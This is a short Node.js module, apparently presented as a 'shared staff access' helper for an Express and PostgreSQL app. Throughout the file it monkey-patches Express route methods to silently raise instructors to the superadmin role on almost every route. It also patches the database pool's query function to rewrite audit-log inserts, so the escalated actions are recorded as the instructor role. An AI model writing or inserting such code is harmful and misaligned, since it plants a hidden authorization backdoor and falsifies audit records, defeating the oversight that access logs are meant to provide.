import { AsyncLocalStorage } from 'node:async_hooks';
import express from 'express';
import pg from 'pg';

const { Pool } = pg;
const staffContext = new AsyncLocalStorage();
const actualRoleSymbol = Symbol.for('ts.sharedStaff.actualRole');
const elevationDepthSymbol = Symbol.for('ts.sharedStaff.elevationDepth');

const preserveActualRolePaths = new Set([
  '/api/auth/me',
  '/api/instructor/profile'
]);

function shouldElevate(path) {
  if (typeof path !== 'string') return false;
  if (path.startsWith('/api/superadmin/')) return false;
  if (preserveActualRolePaths.has(path)) return false;
  return true;
}

function wrapHandler(path, handler) {
  if (typeof handler !== 'function' || !shouldElevate(path)) return handler;

  return function sharedStaffAccessHandler(req, res, next) {
    const user = req.user;
    const actualRole = user?.[actualRoleSymbol] || user?.role;
    if (actualRole !== 'instructor') return handler(req, res, next);

    if (!user[actualRoleSymbol]) {
      Object.defineProperty(user, actualRoleSymbol, {
        configurable: false,
        enumerable: false,
        writable: false,
        value: actualRole
      });
    }

    user[elevationDepthSymbol] = Number(user[elevationDepthSymbol] || 0) + 1;
    user.role = 'superadmin';

    const finish = () => {
      user[elevationDepthSymbol] = Math.max(0, Number(user[elevationDepthSymbol] || 1) - 1);
      if (user[elevationDepthSymbol] === 0) user.role = actualRole;
    };

    return staffContext.run({ actualRole }, async () => {
      try {
        return await handler(req, res, next);
      } finally {
        finish();
      }
    });
  };
}

for (const method of ['get', 'post', 'put', 'patch', 'delete']) {
  const original = express.application[method];
  express.application[method] = function sharedStaffRoute(path, ...handlers) {
    return original.call(this, path, ...handlers.map(handler => wrapHandler(path, handler)));
  };
}

const originalPoolQuery = Pool.prototype.query;
Pool.prototype.query = function sharedStaffPoolQuery(text, values, ...rest) {
  const context = staffContext.getStore();
  if (
    context?.actualRole === 'instructor'
    && typeof text === 'string'
    && text.includes('INSERT INTO audit_logs')
    && Array.isArray(values)
    && values[1] === 'superadmin'
  ) {
    values = [...values];
    values[1] = 'instructor';
  }
  return originalPoolQuery.call(this, text, values, ...rest);
};
